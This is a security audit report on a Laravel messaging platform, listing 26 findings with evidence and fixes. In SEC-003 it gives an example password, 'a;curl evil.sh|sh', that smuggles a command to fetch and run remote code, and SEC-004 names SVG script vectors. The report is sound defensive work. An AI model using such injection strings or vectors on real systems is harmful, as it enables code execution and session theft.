# Security Findings — WhatsMine v1.5.0

**Audit date:** 2026-08-02 · **Method:** static source review + read-only schema inspection + dependency advisories
**No application file was modified.** No exploit was executed against a live system.

## Severity summary

| Severity | Count |
|---|---|
| Critical | 2 |
| High | 6 |
| Medium | 9 |
| Low | 4 |
| Informational | 5 |
| **Total** | **26** |

## Index

| ID | Severity | Category | Title | Status |
|---|---|---|---|---|
| SEC-001 | Critical | Data destruction | Test suite targets the live database and drops all tables | Confirmed |
| SEC-002 | Critical | Dependency | 3 critical + 13 high npm advisories, 5 high Composer advisories | Confirmed |
| ~~SEC-003~~ | High | Credential exposure | `db:backup` leaks DB password to process list; unescaped shell interpolation | ✅ **FIXED 2026-08-07** |
| SEC-004 | High | Stored XSS | SVG accepted for logo/favicon upload and served from public storage | Confirmed |
| SEC-005 | High | Tenant isolation | No model-level scoping; isolation is manual in every query | Confirmed (systemic) |
| SEC-006 | High | Token lifetime | Sanctum tokens never expire (`expiration = null`) | Confirmed |
| SEC-007 | High | Prod safety | `APP_DEBUG=true`; `.env.example` ships `APP_ENV=production` + `APP_DEBUG=true` | Confirmed |
| SEC-008 | High | Dependency | `laravel/framework` + `symfony/http-kernel` carry high-severity advisories | Confirmed |
| SEC-009 | Medium | Session | `session.secure` unset; `same_site=lax`; `encrypt=false` | Confirmed |
| SEC-010 | Medium | Upload | Extension taken from client input (`getClientOriginalExtension`) | Confirmed |
| SEC-011 | Medium | CORS | No `config/cors.php`; Reverb `allowed_origins = ['*']` | Confirmed |
| SEC-012 | Medium | Rate limiting | Only 3 named limiters; most authenticated web routes unthrottled | Confirmed |
| SEC-013 | Medium | Logging | Click-tracking URLs and webhook diagnostics written to logs | Confirmed |
| SEC-014 | Medium | Info leak | Webhook controller embeds a `tinker` command dumping token hashes | Confirmed |
| SEC-015 | Medium | Dependency | `composer.lock` out of sync with `composer.json` | Confirmed |
| SEC-016 | Medium | Data integrity | Only 33 foreign keys across 94 tables | Confirmed |
| SEC-017 | Medium | Abandoned pkg | `nunomaduro/larastan` abandoned | Confirmed |
| SEC-018 | Low | Auth | No password-strength or breach check on registration | Requires verification |
| SEC-019 | Low | Auth | Password reset tokens valid 60 min with 60 s throttle | Confirmed |
| SEC-020 | Low | Headers | CSP relies on `'unsafe-inline'` for scripts and styles | Confirmed |
| SEC-021 | Low | Hygiene | 81 ESLint errors incl. `no-undef`, `no-console` | Confirmed |
| SEC-022 | Info | Positive | Webhook signatures verified with `hash_equals` (28 uses) | Confirmed |
| SEC-023 | Info | Positive | Credentials encrypted at rest in 10+ models | Confirmed |
| SEC-024 | Info | Positive | Click tracker signature-protected — not an open redirect | Confirmed |
| SEC-025 | Info | Positive | No `eval`/`unserialize`; one `exec` only | Confirmed |
| SEC-026 | Info | Positive | All 29 `workspace_id` columns indexed | Confirmed |

---

# Critical

## SEC-001 — Test suite runs against the live database and drops every table

- **Category:** Data destruction / test isolation
- **Severity:** **Critical**
- **File:** `phpunit.xml` lines 26–27; 79 of 81 files under `tests/`
- **Component:** PHPUnit bootstrap; `RefreshDatabase` trait
- **Status:** **Confirmed** (by reading configuration — deliberately *not* executed)

**Evidence**

```xml
<!-- phpunit.xml lines 26-27 — BOTH COMMENTED OUT -->
<!-- <env name="DB_CONNECTION" value="sqlite"/> -->
<!-- <env name="DB_DATABASE" value=":memory:"/> -->
```

No `DB_CONNECTION` or `DB_DATABASE` override survives, so PHPUnit inherits the `.env` connection — the live `whatsmine` MySQL database (94 tables, 20 MB, 9 users at audit time). 79 of 81 test files use `RefreshDatabase`, which executes `migrate:fresh`, dropping every table.

**Business impact.** Any developer or CI runner executing `php artisan test` irrecoverably destroys the working database. With no Git and no backup automation in place, recovery may be impossible.

**Technical impact.** Total loss of application data; migration state reset.

**Recommended fix.** Uncomment lines 26–27 to pin tests to SQLite in-memory, or point them at a dedicated `whatsmine_test` schema (which already exists on this host). Additionally add a guard in `tests/TestCase.php` aborting when the resolved database name lacks a `_test` suffix.

**Effort:** Small (config) / Medium (if migrations prove not SQLite-portable — see AUD-DATA-003).

---

## SEC-002 — Critical and high severity dependency advisories

- **Category:** Vulnerable dependencies
- **Severity:** **Critical** (aggregate)
- **File:** `package-lock.json`, `composer.lock`
- **Status:** **Confirmed** via `npm audit` / `composer audit`

**Evidence**

```
npm audit      → 24 vulnerabilities: 3 critical, 13 high, 7 moderate, 1 low
composer audit → 38 advisories across 15 packages: 5 high, 25 medium, 6 low
```

npm criticals include `concurrently` (via `shell-quote`); highs include `axios`, `form-data`, `@grpc/grpc-js`, `js-yaml`, `postcss`, `lodash-es`, `brace-expansion`, `picomatch`.

Composer highs: `laravel/framework`, `symfony/http-kernel`, `symfony/mime`, `web-token/jwt-library` ×2.

**Business impact.** Known-exploitable code paths in a customer-facing messaging platform handling payment and PII data.

**Technical impact.** Varies by advisory — includes DoS, header injection, prototype pollution, and a Bleichenbacher padding oracle in `web-token/jwt-library`.

**Recommended fix.** Triage each advisory against actual usage; `axios` and `form-data` are directly used by the frontend and are the priority. Do **not** blanket-upgrade — several are transitive under `firebase` and `exceljs`, so verify compatibility. Runtime-only vs build-only should be separated: `concurrently`, `postcss`, `js-yaml` are dev dependencies and lower real risk.

**Effort:** Medium.

---

# High

## SEC-003 — `db:backup` exposes the database password and interpolates it into a shell string

- **Category:** Credential exposure / command injection
- **Severity:** **High**
- **File:** `app/Console/Commands/DbBackupCommand.php` lines 35–40
- **Component:** `DbBackupCommand::handle()`
- **Status:** ✅ **FIXED 2026-08-07** — re-verified 2026-09-02 by reading the current command.
  The `exec()` string below is gone. The password now travels in a **0600 `--defaults-extra-file`**
  that is deleted in a `finally`, and `mysqldump` is invoked through an **argument-array
  `Process`** rather than a shell string — so a password containing shell metacharacters cannot
  inject, and the credential appears in neither the process list nor `/proc/<pid>/environ`.
  The evidence below is retained as the record of what was wrong.

**Evidence**

```php
$env  = "MYSQL_PWD={$pass}";
$cmd  = "{$env} mysqldump --host={$host} --port={$port} --user={$user} {$db} | gzip > "
        .escapeshellarg($tmpPath);
exec($cmd, $output, $return);
```

Only `$tmpPath` is escaped. `$pass`, `$host`, `$port`, `$user`, `$db` are interpolated raw.

**Business impact.** The database password is visible in the process table (`ps aux`) to every local user for the duration of the dump — on shared hosting, to other tenants.

**Technical impact.** Two issues: (a) credential disclosure via process list and potentially shell history/logs; (b) command injection if any config value contains shell metacharacters — a password such as `a;curl evil.sh|sh` executes. Exploitation requires the ability to influence configuration, so this is escalation rather than remote entry.

**Recommended fix.** Wrap every interpolated value in `escapeshellarg()`, and pass the password via the environment array of `Symfony\Component\Process\Process` rather than inline. `Process` also removes the shell entirely.

**Effort:** Small.

---

## SEC-004 — SVG accepted for logo/favicon upload → stored XSS

- **Category:** Stored XSS / unrestricted file upload
- **Severity:** **High**
- **File:** `app/Http/Controllers/Admin/SystemSettingsController.php` lines 87, 115
- **Component:** `uploadLogo()`, `uploadFavicon()`
- **Status:** **Confirmed** (code); exploitability depends on how the asset is served — **requires manual verification**

**Evidence**

```php
'logo'    => ['required','image','mimes:png,jpg,jpeg,gif,svg,webp','max:2048'],
'favicon' => ['required','file','mimes:png,jpg,jpeg,gif,ico,svg,webp','max:512'],
```

Stored via `StorageManager` and served from the public disk. SVG is an XML document that may contain `<script>`, `onload=`, and `xlink:href="javascript:"`.

**Business impact.** A compromised or malicious admin account persists JavaScript that executes for every visitor loading the branding asset directly — session theft across the whole tenant base for a system-level logo.

**Technical impact.** Stored XSS in same-origin context. The app's CSP includes `'unsafe-inline'` for `script-src`, so inline SVG script would not be blocked when the SVG is opened as a top-level document (CSP of the HTML page does not apply to a directly-navigated SVG).

**Mitigating factor.** Upload requires `manage_settings` permission — not an anonymous vector.

**Recommended fix.** Drop `svg` from both `mimes` lists. If SVG branding is a product requirement, sanitise server-side (e.g. `enshrined/svg-sanitize`) and serve with `Content-Disposition: attachment` plus `Content-Security-Policy: default-src 'none'`.

**Effort:** Small.

---

## SEC-005 — Tenant isolation is manual; no model-level enforcement

- **Category:** Broken access control / IDOR
- **Severity:** **High** (systemic risk)
- **File:** `app/Http/Middleware/EnsureClientScope.php`; all models under `app/Models/`, `app/Modules/*/Models/`
- **Status:** **Confirmed** that no enforcement layer exists. **Requires manual verification** that no individual query is unscoped.

**Evidence**

`EnsureClientScope` only annotates the request — it enforces nothing:

```php
if ($user && $user->client_id) {
    $request->attributes->set('current_client_id', $user->client_id);
}
return $next($request);
```

Its own docblock states *"Controllers should use this to scope queries"*.

Searches returned **zero** results for `addGlobalScope`, `ScopedBy`, or any tenant trait across every model. 29 of 94 tables carry `workspace_id`; correctness depends on each of ~494 routes remembering to filter.

**Sampled controllers were correct** — `MediaController::destroy` (line 77), `TeamController::destroy` (line 131), `InvitationController::destroy` (line 70) and `NotificationController` all check ownership explicitly or scope through the user relationship. So the discipline is real, but it is unenforced.

**Business impact.** One forgotten `where('workspace_id', …)` in any future change leaks another tenant's conversations, contacts, or orders. In a multi-tenant SaaS this is the highest-consequence class of defect.

**Technical impact.** Cross-tenant IDOR; no defence in depth.

**Recommended fix.** Introduce a `BelongsToWorkspace` trait applying an Eloquent global scope bound to the authenticated user's workspace, and apply it to all 29 workspace-owned models. Retain the existing explicit checks — the global scope is the safety net, not a replacement. Add an automated test asserting cross-tenant reads return 404.

**Effort:** Large.

---

## SEC-006 — Sanctum API tokens never expire

- **Category:** Session/token management
- **Severity:** **High**
- **File:** `config/sanctum.php`
- **Status:** **Confirmed** — `sanctum.expiration` resolves to `null`

**Evidence.** `config('sanctum.expiration')` → `NULL`. Laravel treats `null` as *never expires*. `routes/api.php` exposes 71 routes under `auth:sanctum`, including the mobile app surface.

**Business impact.** A token captured from a lost device, a log, or a backup grants indefinite API access. Revocation requires knowing the token was compromised.

**Technical impact.** Unbounded credential lifetime; no natural rotation.

**Recommended fix.** Set an expiry (commonly 1–24 h for mobile with refresh, or 30 days maximum) and schedule `sanctum:prune-expired`.

**Effort:** Small.

---

## SEC-007 — Debug mode enabled; `.env.example` ships an unsafe production default

- **Category:** Production safety / information disclosure
- **Severity:** **High**
- **File:** `.env.example`; current runtime config
- **Status:** **Confirmed**

**Evidence.** `config('app.debug')` → `true`. `.env.example` ships `APP_ENV=production` **together with** `APP_DEBUG=true`.

Current runtime is `APP_ENV=local`, which is correct for development — but the shipped example steers every new deployment into production-with-debug.

**Business impact.** With `APP_DEBUG=true` in production, Laravel's error page renders stack traces, file paths, SQL, and environment variables to any visitor who triggers an exception.

**Technical impact.** Full configuration disclosure including credentials present in the exception context.

**Recommended fix.** Set `APP_DEBUG=false` in `.env.example`. Add a boot-time assertion refusing to serve when `APP_ENV=production && APP_DEBUG=true`.

**Effort:** Small.

---

## SEC-008 — High-severity advisories in framework and HTTP layer

- **Category:** Vulnerable dependencies
- **Severity:** **High**
- **File:** `composer.lock`
- **Status:** **Confirmed**

**Evidence.** `laravel/framework` (1 high), `symfony/http-kernel` (1 high), `symfony/mime` (1 high), `web-token/jwt-library` (2 high).

These sit directly in the request path (`http-kernel`) and the outbound mail path (`mime`).

**Recommended fix.** `composer update` for the affected constraints in a branch, then run the full test suite — *after* SEC-001 is fixed, since the suite is currently destructive.

**Effort:** Medium.

---

# Medium

## SEC-009 — Session cookie hardening incomplete

- **Severity:** Medium · **File:** `config/session.php` · **Status:** Confirmed

`session.secure` → `NULL` (not forced), `session.encrypt` → `false`, `same_site` → `lax`, `session.domain` → `NULL`.

`secure = null` means Laravel defers to `SESSION_SECURE_COOKIE`, unset in `.env.example` — so cookies transmit over plain HTTP if the deployment ever serves it. `lax` is acceptable but `strict` is preferable for an admin panel.

**Fix:** Set `SESSION_SECURE_COOKIE=true` in `.env.example` and force HTTPS in production. Consider `SESSION_ENCRYPT=true`. **Effort:** Small.

## SEC-010 — Upload filename extension derived from client input

- **Severity:** Medium · **File:** `SystemSettingsController.php` lines 96, 124 · **Status:** Confirmed

```php
$path = $sm->prefixedPath('branding/logo-'.Str::uuid().'.'.$file->getClientOriginalExtension());
```

`getClientOriginalExtension()` is attacker-supplied. The preceding `mimes:` rule constrains it, so this is not independently exploitable — but it is the wrong primitive and becomes dangerous if validation is ever relaxed.

**Fix:** Use `$file->extension()` (guessed from content) or map the validated MIME type to a fixed extension. **Effort:** Small.

## SEC-011 — CORS unconfigured; Reverb accepts all origins

- **Severity:** Medium · **File:** absent `config/cors.php`; `config/reverb.php:85` · **Status:** Confirmed

No `config/cors.php` exists and `HandleCors` is not registered in `bootstrap/app.php`, so the 71 `/api/v1` routes have no explicit CORS policy. `config/reverb.php` line 85 sets `'allowed_origins' => ['*']`.

**Fix:** Publish `config/cors.php` with an explicit origin allowlist for the API; restrict Reverb origins before enabling realtime. **Effort:** Small.

## SEC-012 — Rate limiting is sparse

- **Severity:** Medium · **File:** `app/Providers/AppServiceProvider.php:110-122`, `routes/*` · **Status:** Confirmed

Only three named limiters exist (`api`, `webhooks`, `ai-runs`). Auth routes are throttled (`5,1` / `6,1` / `10,1`), and webhooks are covered. But the 224 `/app/*` client routes and 112 `/admin/*` routes carry **no throttle**, including expensive endpoints (exports, bulk import, analytics).

**Fix:** Apply a default limiter to the `web` authenticated groups; tighten around export/report endpoints. **Effort:** Small.

## SEC-013 — Sensitive values written to logs

- **Severity:** Medium · **File:** `EmailTrackingController.php:102-106`; `WhatsappWebhookController.php:124` · **Status:** Confirmed

Click-tracking logs the full destination URL (which may carry campaign/recipient identifiers). Webhook diagnostics log token-matching hints.

**Fix:** Log identifiers, not URLs; ensure `LOG_LEVEL=error` in production (currently `error` ✅). **Effort:** Small.

## SEC-014 — Webhook controller embeds a credential-dumping command in a response hint

- **Severity:** Medium · **File:** `app/Modules/Whatsapp/Http/Controllers/WhatsappWebhookController.php:124` · **Status:** Confirmed

The failure path returns a `hint` string containing a ready-to-run `php artisan tinker` command that prints `webhook_verify_token_hash` values from the database.

**Fix:** Remove the hint from any response body; keep it in a developer log only, behind `APP_DEBUG`. **Effort:** Small.

## SEC-015 — `composer.lock` out of sync with `composer.json`

- **Severity:** Medium · **File:** `composer.lock` · **Status:** Confirmed

```
composer validate → ./composer.json is valid but your composer.lock has some errors
  - The lock file is not up to date with the latest changes in composer.json
```

**Impact:** `composer install` on a fresh deploy may resolve differently from development. Reproducible builds are not guaranteed.

**Fix:** Run `composer update --lock` and commit. **Effort:** Small.

## SEC-016 — Sparse foreign-key coverage

- **Severity:** Medium · **File:** `database/migrations/`, live schema · **Status:** Confirmed

Live schema: **94 tables, only 33 foreign keys**. Migrations contain 29 `foreignId` and 24 `onDelete` clauses. 261 indexes and 55 unique constraints exist, so indexing is healthy — referential integrity is not.

**Impact:** Orphaned rows on delete; integrity enforced only in application code.

**Fix:** Audit the 65 tables lacking FKs; add constraints with explicit `onDelete` behaviour where the relationship is mandatory. **Effort:** Large.

## SEC-017 — Abandoned package

- **Severity:** Medium · **File:** `composer.json` · **Status:** Confirmed

`nunomaduro/larastan` is abandoned; upstream advises `larastan/larastan`. Dev-only, so no runtime exposure, but it blocks future PHPStan upgrades.

**Fix:** Rename the requirement to `larastan/larastan`. **Effort:** Small.

---

# Low

## SEC-018 — No password strength or breach policy
**Low** · `app/Http/Controllers/Auth/*` · **Requires manual verification.** Registration/reset appear to use Laravel defaults (min 8). Consider `Password::defaults()` with `->uncompromised()`. **Effort:** Small.

## SEC-019 — Password reset window
**Low** · `config/auth.php` · Confirmed. `expire = 60` minutes with `throttle = 60` seconds. 60 minutes is generous; 15 is common. **Effort:** Small.

## SEC-020 — CSP depends on `'unsafe-inline'`
**Low** · `app/Http/Middleware/SecureHeaders.php:43-44` · Confirmed. Both `script-src` and `style-src` include `'unsafe-inline'`, substantially weakening CSP as an XSS control (relevant to SEC-004). Inertia/Vite make nonces awkward but not impossible. **Effort:** Large.

## SEC-021 — Frontend lint failures
**Low** · `resources/js/` · Confirmed. ESLint: **194 problems (81 errors, 113 warnings)**, including `no-undef` for `Notification` and multiple `no-console`. `no-undef` indicates a genuine runtime-error risk. **Effort:** Medium.

---

# Informational — verified-positive controls

These were tested and found **sound**; recorded so future changes do not regress them.

## SEC-022 — Webhook signature verification is correct
28 uses of `hash_equals` across 14 files covering Stripe, PayPal, Paddle, Razorpay, Paymob, MercadoPago, Tap, Cashfree, Square, Paystack, Meta, WhatsApp, SMS, and e-commerce webhooks. Only `app/Models/WebhookEndpoint.php` uses `hash_hmac` without `hash_equals`, and inspection confirms it *generates* outbound signatures (line 41) rather than verifying — correct.

> ⚠️ **SUPERSEDED 2026-09-07.** Nine gateways (Paddle, Tap, Paystack, Xendit, Paymob,
> MyFatoorah, Mollie, Square, MercadoPago) were removed on `feature/payment-gateway-cleanup`.
> **Four remain: Stripe, PayPal, Razorpay, Cashfree.** The counts and line totals above are the
> measurement as taken on the date of this report and are left unedited as a record; they no
> longer describe the codebase.


## SEC-023 — Third-party credentials encrypted at rest
`encrypted` casts present in 10+ models: `PaymentGatewayConfig`, `SmtpConfiguration`, `SystemSetting`, `AiProviderConfig`, `SmsProviderConfig`, `WorkspaceSmtpConfig`, `EcommerceStore`, `IntegrationConfig`, `ChannelAccount`, `User`.

## SEC-024 — Click tracker is not an open redirect
`EmailTrackingController::click` enforces `$request->hasValidSignature()` (403 on failure) **and** an `http/https` scheme allowlist before `redirect()->away()`. Correctly defended.

## SEC-025 — No dangerous dynamic execution
Zero occurrences of `eval`, `create_function`, or `unserialize` in `app/`. Exactly one `exec()` — see SEC-003. The `DB::raw` interpolation in `InboxDuplicateReportCommand` (lines 73–78) uses `$path` built from a hardcoded array `['messenger_psid','instagram_psid']`, so it is **not** injectable.

## SEC-026 — Tenant column indexing is complete
All 29 tables carrying `workspace_id` have an index on it — verified by querying `information_schema`. No mass-assignment risk either: zero models declare `$guarded = []`.
